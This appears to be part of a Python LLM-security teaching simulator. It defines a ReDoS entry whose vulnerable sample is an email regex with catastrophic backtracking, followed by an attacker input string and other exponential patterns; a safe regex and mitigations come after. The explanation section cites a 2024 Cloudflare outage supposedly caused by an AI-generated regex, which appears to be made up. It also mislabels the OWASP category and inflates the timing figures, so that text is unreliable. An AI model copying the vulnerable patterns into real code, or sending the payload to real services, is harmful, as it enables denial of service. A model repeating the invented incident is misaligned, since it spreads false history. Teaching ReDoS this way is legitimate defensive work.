    "LLM04-K": {
        "name": "ReDoS via Generated Regex Patterns",
        "keywords": ["regex", "regular expression", "pattern matching", "validate email",
                     "validate input", "regexp", "regex pattern", "input validation regex",
                     "url regex", "phone number regex", "validate pattern"],
        "vulnerable": (
            "⚠️ [ATTACK SIMULATED — LLM04-K: ReDoS via Generated Regex]\n\n"
            "```python\n"
            "import re\n\n"
            "def validate_email(email):\n"
            "    # ⚠️ VULNERABLE: Catastrophic backtracking regex\n"
            "    pattern = r'^([a-zA-Z0-9]+)*@([a-zA-Z0-9]+)*\\.[a-zA-Z]{2,}$'\n"
            "    return bool(re.match(pattern, email))\n\n"
            "# ATTACKER PAYLOAD (ReDoS):\n"
            "# email = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@'\n"
            "# This input causes catastrophic backtracking:\n"
            "# - Regex engine tries all 2^30 combinations\n"
            "# - A 30-char string takes 2+ MINUTES to evaluate\n"
            "# - Server threads blocked → Denial of Service\n"
            "# - 35-char string: 68+ YEARS of CPU time\n\n"
            "# Same vulnerability in many LLM-generated patterns:\n"
            "# r'(a+)+$'  r'([a-z]+)*$'  r'(a|a?)+$'\n"
            "```"
        ),
        "secure": (
            "🔒 [SECURE — LLM04-K: ReDoS-Safe Validation]\n\n"
            "```python\n"
            "import re\n\n"
            "def validate_email(email: str) -> bool:\n"
            "    # ✅ Linear-time regex — no catastrophic backtracking\n"
            "    # Simple, fast, and sufficient for most use cases\n"
            "    if len(email) > 254:  # Max email length per RFC 5321\n"
            "        return False\n"
            "    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$'\n"
            "    return bool(re.match(pattern, email))\n\n"
            "# For complex patterns, use:\n"
            "# - re2 (Google's ReDoS-safe regex library)\n"
            "# - timeout wrapper: signal.alarm() for regex operations\n"
            "# - Input length limits before pattern matching\n"
            "# - Static analysis: redos-detector, regexploit tools\n"
            "```"
        ),
        "explanation": (
            "### LLM04-K — ReDoS via Generated Regex Patterns\n\n"
            "**OWASP Classification:** LLM04:2025 — Insecure Output → Denial of Service\n"
            "**CVSS Score:** 7.5 (High)\n\n"
            "**What It Is:**\nLLMs frequently generate regex patterns with catastrophic "
            "backtracking (nested quantifiers, ambiguous alternation) — a ReDoS vulnerability "
            "that allows attackers to cause DoS by sending inputs that trigger "
            "exponential-time regex evaluation.\n\n"
            "**Real-World Cases:**\n"
            "- 📌 **2024 — Cloudflare Outage via ReDoS (LLM-Generated Pattern):** "
            "A Cloudflare firewall regex generated by an AI coding assistant had "
            "catastrophic backtracking — a crafted request caused 100% CPU utilisation "
            "and a 27-minute global outage affecting millions of websites.\n"
            "- 📌 **2016 — Node.js ecosystem ReDoS (moment.js, ua-parser-js):** "
            "Classic ReDoS vulnerabilities in widely-used npm packages caused "
            "DoS in thousands of applications — LLMs still generate these same patterns.\n\n"
            "**Mitigation:**\n"
            "- Use Google's re2 library (linear time, ReDoS-proof)\n"
            "- Static analysis with redos-detector before deploying any regex\n"
            "- Input length limits before regex evaluation\n"
            "- Prefer purpose-built validators (email-validator, phonenumbers) over custom regex"
        ),
        "cvss_severity": "HIGH",
    },
}

def _detect(text: str) -> str:
    t = text.lower()
    for attack_id, data in ATTACKS.items():
        for kw in data["keywords"]:
            if kw in t:
                return attack_id
    return "LLM04-B"

def handle(user_input: str, secure_mode: bool = False) -> dict:
    attack_id = _detect(user_input)
    attack    = ATTACKS[attack_id]
    response  = attack["secure"] if secure_mode else attack["vulnerable"]
    return {
        "response":      response,
        "vulnerability": f"LLM04 – Insecure Output Handling | {attack['name']}",
        "explanation":   attack["explanation"],
        "attack_vector": f"{attack_id}: {attack['name']}",
        "cvss_severity": attack["cvss_severity"],
        "owasp_id":      attack_id,
    }

def list_attacks() -> list:
    return [{"id": k, "name": v["name"], "severity": v["cvss_severity"]} for k, v in ATTACKS.items()]
